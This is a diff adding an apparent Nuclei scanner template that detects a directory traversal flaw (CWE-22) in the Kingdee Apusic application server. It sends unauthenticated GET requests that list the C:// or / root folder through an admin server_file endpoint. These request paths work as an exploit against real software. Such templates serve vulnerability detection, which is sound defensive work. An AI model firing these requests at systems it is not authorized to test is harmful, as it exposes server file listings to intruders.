@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - condition: or
+          part: body
+          type: word
+          words:
+            - '{"name":"Windows","path":"C:\\\\Windows","folder":true}'
+            - '{"name":"root","path":"/root","folder":true}'
+        - part: header
+          type: word
+          words:
+            - application/json
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/admin/protected/selector/server_file/files?folder=C://&suffix='
+        - '{{BaseURL}}/admin/protected/selector/server_file/files?folder=/&suffix='
+      stop-at-first-match: true
+id: kingdee-apusic-directory-traversal
+info:
+    author: SleepingBag945
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: Kingdee Apusic server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.
+    name: Kingdee Apusic - Local File Inclusion
+    reference:
+        - http://wiki.peiqi.tech/wiki/oa/%E9%87%91%E8%9D%B6OA/%E9%87%91%E8%9D%B6OA%20Apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8-%E4%B8%AD%E9%97%B4%E4%BB%B6%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
+    severity: medium
+    tags:
+        - kingdee
+        - traversal
